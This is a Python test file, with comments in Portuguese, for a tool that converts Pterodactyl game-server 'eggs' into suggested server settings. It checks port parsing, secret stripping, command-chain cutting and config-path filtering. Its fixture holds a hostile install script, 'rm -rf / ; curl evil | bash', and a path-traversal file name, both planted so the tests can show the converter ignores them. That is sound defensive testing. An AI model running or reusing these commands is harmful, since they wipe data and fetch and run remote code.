"""tools/import-pterodactyl.py: o que sai dele vira sugestao no formulario, e um egg do Pterodactyl
e arquivo de terceiros. Cada regra de seguranca do conversor tem um caso aqui, com trechos no
formato real dos eggs (pelican-eggs/games-steamcmd)."""
from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

from gamebroker.services.catalog import KEY_RE, validate_dynamic

RAIZ = Path(__file__).resolve().parents[3]
_spec = importlib.util.spec_from_file_location("import_pterodactyl", RAIZ / "tools" / "import-pterodactyl.py")
imp = importlib.util.module_from_spec(_spec)
sys.modules["import_pterodactyl"] = imp
_spec.loader.exec_module(imp)

VRISING_README = """
### Server Ports

| Port                                   | Default | Protocol |
| -------------------------------------- | ------- | -------- |
| **Game (Primary Port)**   | 9876    | UDP      |
| Query                                  | 9877    | UDP      |
| RCON                                   | 25575   | TCP      |

### Installation/System Requirements

| RAM | 3072 MiB | 4096 |
"""


def _egg(startup: str, variables: dict[str, str], image: str = "ghcr.io/parkervcp/yolks:debian",
         files: dict | None = None, name: str = "Jogo Teste") -> dict:
    return {
        "name": name, "startup": startup, "docker_images": {image: image},
        "config": {"files": json.dumps(files or {})},
        "variables": [{"env_variable": k, "default_value": v, "rules": "required|string"}
                      for k, v in variables.items()],
        "scripts": {"installation": {"script": "rm -rf / ; curl evil | bash"}},
    }


def _suggest(egg: dict, readme: str = VRISING_README) -> dict:
    s = imp.suggest(imp.Egg(egg, readme, "jogo_teste"))
    assert s is not None
    return s


def test_tabela_de_portas_do_readme_da_a_porta_que_o_egg_nao_tem():
    """A porta principal do egg e a ALOCACAO do Pterodactyl, sem numero no JSON."""
    ports = imp.classify_ports(imp.port_rows(VRISING_README))
    assert (ports.game, ports.query) == (9876, 9877)
    assert ports.exposed == ("9876/udp", "9877/udp")


def test_rcon_nunca_vira_porta_exposta():
    assert "25575" not in " ".join(imp.classify_ports(imp.port_rows(VRISING_README)).exposed)


def test_tabela_sem_protocolo_presume_udp_e_avisa():
    readme = "## Server Ports\n\n| Port | default |\n|---|---|\n| Game | 7777 |\n| Game +1 | 7778 |\n"
    ports = imp.classify_ports(imp.port_rows(readme))
    assert ports.exposed == ("7777/udp", "7778/udp")
    assert ports.presumed_udp
    s = _suggest(_egg("./srv -port={{SERVER_PORT}}", {"SRCDS_APPID": "123"}), readme)
    assert any("presumi UDP" in w for w in s["warnings"])


def test_tabela_fora_da_secao_de_portas_e_ignorada():
    """A de requisitos tem numero (3072 MiB) e nao e porta."""
    assert all(r.number != 3072 for r in imp.port_rows(VRISING_README))


def test_marcadores_trocam_a_porta_e_a_query_do_egg():
    s = _suggest(_egg("./srv -port {{SERVER_PORT}} -queryPort {{QUERY_PORT}}",
                      {"SRCDS_APPID": "123", "QUERY_PORT": "9877"}))
    assert s["start_args"] == "-port {PORT} -queryPort {QUERY_PORT}"
    assert s["shiftable"] is True


def test_segredo_nunca_e_resolvido_e_a_opcao_sai_junto():
    s = _suggest(_egg('./srv -port {{SERVER_PORT}} -password {{SERVER_PASSWORD}} -name "{{SERVER_NAME}}" -log',
                      {"SRCDS_APPID": "123", "SERVER_PASSWORD": "hunter2", "SERVER_NAME": "Meu"}))
    assert "hunter2" not in s["start_args"]
    assert "-password" not in s["start_args"]
    assert "-name" not in s["start_args"]
    assert s["start_args"] == "-port {PORT} -log"
    assert any("password" in w for w in s["warnings"])


def test_variavel_comum_vira_o_valor_padrao():
    s = _suggest(_egg("./srv -port={{SERVER_PORT}} -maxplayers={{MAX_PLAYERS}}",
                      {"SRCDS_APPID": "123", "MAX_PLAYERS": "16"}))
    assert s["start_args"] == "-port={PORT} -maxplayers=16"


def test_encadeamento_e_cortado_e_o_script_de_instalacao_nunca_e_lido():
    s = _suggest(_egg("./srv -port {{SERVER_PORT}} | tee log.txt",
                      {"SRCDS_APPID": "123"}))
    assert s["start_args"] == "-port {PORT}"
    assert "curl" not in json.dumps(s)
    assert "rm -rf" not in json.dumps(s)


def test_preparacao_do_container_nao_vira_o_executavel():
    """`Xvfb :0 ...; xvfb-run wine X.exe` - o primeiro trecho e o X virtual, nao o jogo."""
    s = _suggest(_egg("xvfb :0 -screen 0 1024x768x16; DISPLAY=:0.0 xvfb-run wine /home/container/Srv.exe -log",
                      {"SRCDS_APPID": "123", "WINDOWS_INSTALL": "1"}, image="ghcr.io/parkervcp/yolks:wine_latest"))
    assert s["start_script"] == "Srv.exe"
    assert s["start_args"] == "-log"


def test_cd_antes_do_executavel_entra_no_caminho():
    s = _suggest(_egg("cd /home/container/Game/Binaries/Win64; xvfb-run -a proton run ./GameServer.exe -PORT={{SERVER_PORT}}",
                      {"SRCDS_APPID": "123"}, image="ghcr.io/parkervcp/steamcmd:proton"))
    assert s["start_script"] == "Game/Binaries/Win64/GameServer.exe"
    assert s["start_args"] == "-PORT={PORT}"


def test_servidor_de_windows_sai_com_proton_e_xvfb_quando_o_egg_usa():
    """Regra do repositorio: Proton primeiro, mesmo quando o egg usa wine."""
    s = _suggest(_egg("xvfb-run wine ./VRisingServer.exe -persistentDataPath save-data",
                      {"SRCDS_APPID": "1829350", "WINDOWS_INSTALL": "1"}, image="ghcr.io/parkervcp/yolks:wine_staging"))
    assert s["platform"] == "windows"
    assert s["recipes"] == ["proton", "xvfb"]


def test_servidor_linux_nao_ganha_runtime_de_windows():
    s = _suggest(_egg("./srv -port {{SERVER_PORT}}", {"SRCDS_APPID": "123"}))
    assert s["platform"] == ""
    assert s["recipes"] == []


def test_interpretador_no_lugar_do_executavel_fica_em_branco_com_aviso():
    s = _suggest(_egg("java -Xmx{{SERVER_MEMORY}}M -jar server.jar", {"SRCDS_APPID": "123"}))
    assert (s["start_script"], s["start_args"]) == ("", "")
    assert any("java" in w for w in s["warnings"])


def test_pasta_do_container_vira_a_do_jogo():
    s = _suggest(_egg("./srv +server_dir /home/container/data", {"SRCDS_APPID": "123"}))
    assert s["start_args"] == "+server_dir /opt/game/data"


def test_egg_sem_app_id_ou_com_conta_steam_fica_de_fora():
    assert imp.suggest(imp.Egg(_egg("./srv", {}), "", "x")) is None
    assert imp.suggest(imp.Egg(_egg("./srv", {"SRCDS_APPID": "1007"}), "", "x")) is None, "Steamworks SDK"
    account = _egg("./srv", {"SRCDS_APPID": "221100", "STEAM_USER": ""})
    account["variables"][-1]["rules"] = "required|string"
    account["variables"][-1]["default_value"] = "minha-conta"
    assert imp.suggest(imp.Egg(account, "", "x")) is None


def test_arquivos_de_config_do_egg_viram_caminhos_sob_opt_game():
    s = _suggest(_egg("./srv", {"SRCDS_APPID": "123"},
                      files={"save-data/Settings/ServerHostSettings.json": {}, "../../etc/passwd.ini": {},
                             "start.sh": {}}))
    assert s["config_files"] == ["/opt/game/save-data/Settings/ServerHostSettings.json"]
    assert s["config_path"] == "/opt/game/save-data/Settings"


def test_nome_e_chave():
    assert imp.display_name("Astroneer Dedicated Server") == "Astroneer"
    assert imp.display_name("Mount & Blade II: Bannerlord") == "Mount & Blade II: Bannerlord"
    assert KEY_RE.fullmatch(imp.game_key("7 Days to Die"))
    assert imp.game_key("7 Days to Die").startswith("g-")


def test_o_que_sai_passa_no_validador_do_broker():
    s = _suggest(_egg("./srv -port {{SERVER_PORT}} -queryPort {{QUERY_PORT}}",
                      {"SRCDS_APPID": "123", "QUERY_PORT": "9877"}))
    assert validate_dynamic(imp.as_panel_data(s)).key == s["key"]


def test_complemento_so_preenche_o_que_o_linuxgsm_deixou_vazio():
    linuxgsm = {"appid": 5, "key": "jogo", "name": "Jogo", "ports": "7777/udp", "game_port": 7777,
                "query_port": 0, "extra_port": 0, "start_script": "srv", "start_args": "-port={PORT}",
                "shiftable": True, "config_path": "", "config_files": [], "player_source": "log", "warnings": []}
    egg = {**linuxgsm, "ports": "9000/udp", "game_port": 9000, "config_path": "/opt/game/cfg",
           "config_files": ["/opt/game/cfg/server.ini"]}
    extra = imp.complement(linuxgsm, egg)
    assert extra == {"config_path": "/opt/game/cfg", "config_files": ["/opt/game/cfg/server.ini"]}
    assert imp.complement({**linuxgsm, "config_files": ["/opt/game/a.ini"]}, egg) == {}
